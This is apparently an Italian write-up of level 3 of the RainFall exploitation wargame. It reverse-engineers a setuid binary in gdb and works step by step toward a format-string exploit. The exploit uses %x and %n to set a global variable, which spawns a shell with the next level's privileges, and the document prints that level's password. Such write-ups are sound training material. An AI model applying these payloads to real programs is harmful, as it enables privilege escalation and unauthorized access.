# Level 3
Come prima cosa controlliamo le stringhe presenti nell'eseguibile:
```
level3@RainFall:~$ readelf -p '.rodata' level3

String dump of section '.rodata':
  [     8]  Wait what?!^J
  [    15]  /bin/sh
```
Notiamo che nell'eseguibile è presente il percorso `/bin/sh`.
Ora verifichiamo le funzioni chiamate nell'eseguibile e disassembliamo
quelle scritte dall'utente:
```
level3@RainFall:~$ gdb -q level3
Reading symbols from /home/user/level3/level3...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048344  _init
0x08048390  printf
0x08048390  printf@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  fwrite
0x080483b0  fwrite@plt
0x080483c0  system
0x080483c0  system@plt
0x080483d0  __gmon_start__
0x080483d0  __gmon_start__@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  v
0x0804851a  main
0x08048530  __libc_csu_init
0x080485a0  __libc_csu_fini
0x080485a2  __i686.get_pc_thunk.bx
0x080485b0  __do_global_ctors_aux
0x080485dc  _fini
(gdb) disass main
Dump of assembler code for function main:
   0x0804851a <+0>:     push   %ebp
   0x0804851b <+1>:     mov    %esp,%ebp
   0x0804851d <+3>:     and    $0xfffffff0,%esp
   0x08048520 <+6>:     call   0x80484a4 <v>
   0x08048525 <+11>:    leave
   0x08048526 <+12>:    ret
End of assembler dump.
(gdb) disass v
Dump of assembler code for function v:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x218,%esp
   0x080484ad <+9>:     mov    0x8049860,%eax
   0x080484b2 <+14>:    mov    %eax,0x8(%esp)
   0x080484b6 <+18>:    movl   $0x200,0x4(%esp)
   0x080484be <+26>:    lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:    mov    %eax,(%esp)
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:    lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:    mov    %eax,(%esp)
   0x080484d5 <+49>:    call   0x8048390 <printf@plt>
   0x080484da <+54>:    mov    0x804988c,%eax
   0x080484df <+59>:    cmp    $0x40,%eax
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
   0x080484e4 <+64>:    mov    0x8049880,%eax
   0x080484e9 <+69>:    mov    %eax,%edx
   0x080484eb <+71>:    mov    $0x8048600,%eax
   0x080484f0 <+76>:    mov    %edx,0xc(%esp)
   0x080484f4 <+80>:    movl   $0xc,0x8(%esp)
   0x080484fc <+88>:    movl   $0x1,0x4(%esp)
   0x08048504 <+96>:    mov    %eax,(%esp)
   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:   movl   $0x804860d,(%esp)
   0x08048513 <+111>:   call   0x80483c0 <system@plt>
   0x08048518 <+116>:   leave
   0x08048519 <+117>:   ret
End of assembler dump.
```
### Funzione `main`:
In questa funzione troviamo solo una chiamata alla funzione `v`
### Funzione `v`:
In questa funzione vengono riservati 0x218 (536) byte per le variabili
locali, poi vengono chiamate le funzioni `fgets` e `printf` nel seguente
modo:
```
fgets(s, 512, stdin);
printf(s);
```
e successivamente viene verificato il valore presente nell'indirizzo
`0x804988c` se equivale a 0x40 (64), se ciò risultasse vero allora
verra chiamata la funzione `system` passandogli `/bin/sh` altrimenti
la funzione restituisce il controllo.
Tramite il comando `objdump -D level3` possiamo effettivamente vedere
che l'indirizzo `0x804988c` corrisponde alla variabile `m` salvata
nella sezione `.bss`:
```
Disassembly of section .bss:

0804988c <m>:
 804988c:       00 00                   add    %al,(%eax)
        ...
```
Dunque bisogna modificare il valore in questa variabile e sfrutteremo
la vulnerabilità di printf dato che l'input non viene controllato.
Iniziamo ad inserire un po di `%x` per vedere in che punto della memoria
printf andrà a recuperare le informazioni:
```
level3@RainFall:~$ ./level3
AAA %x.%x.%x.%x
AAA 200.b7fd1ac0.b7ff37d0.20414141
```
notiamo che nel quarto `%x` viene stampata la stringa scritta quindi
ora inseriamo l'indirizzo della variabile all'inizio della stringa:
```
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "%x. "*4 ' > /tmp/exploit
level3@RainFall:~$ gdb -q level3
Reading symbols from /home/user/level3/level3...(no debugging symbols found)...done.
(gdb) r < /tmp/exploit
Starting program: /home/user/level3/level3 < /tmp/exploit
��200. b7fd1ac0. b7ff37d0. 804988c.
```
ora sfruttiamo `%n` per memorizzare il ritorno di printf nell'indirizzo
appena scritto, quindi sostituiamo il quarto `%x` con `%n`:
```
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "%x. "*3 + "%n" ' > /tmp/exploit
level3@RainFall:~$ gdb -q level3
Reading symbols from /home/user/level3/level3...(no debugging symbols found)...done.
(gdb) b *0x080484df
Breakpoint 1 at 0x80484df
(gdb) r < /tmp/exploit
Starting program: /home/user/level3/level3 < /tmp/exploit
��200. b7fd1ac0. b7ff37d0.

Breakpoint 1, 0x080484df in v ()
(gdb) p *0x804988c
$1 = 29
(gdb) c
Continuing.
[Inferior 1 (process 4051) exited with code 035]
```
ora abbiamo il valore 29 nella variabile, quindi basterà scrivere un totale
di 64 caratteri:
```
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "a"*35 + "%x. "*3 + "%n" ' > /tmp/ex
ploit
level3@RainFall:~$ cat /tmp/exploit - | ./level3
��aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa200. b7fd1ac0. b7ff37d0.
Wait what?!
id
uid=2022(level3) gid=2022(level3) euid=2025(level4) egid=100(users) groups=2025(level4),100(users),2022(level3)
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
exit
exit
level3@RainFall:~$ su level4
Password: b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
level4@RainFall:~$
```